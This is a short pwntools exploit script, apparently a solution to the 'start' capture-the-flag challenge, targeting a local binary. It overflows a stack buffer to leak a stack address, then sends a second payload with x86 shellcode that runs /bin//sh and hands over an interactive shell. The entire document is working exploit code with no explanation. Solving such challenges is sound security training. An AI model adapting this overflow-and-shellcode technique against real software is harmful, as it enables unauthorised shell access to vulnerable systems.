from pwn import *
p = process('./start')
payload1 = 'a'*20+p32(0x08048087)
p.recvuntil(':')
p.send(payload1)
leak = p.recv(4)
leak=u32(leak)
shellcode = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
pay2 = 'a'*20 + p32(leak+20)  + shellcode
p.send(pay2)
p.interactive()
#exp for start
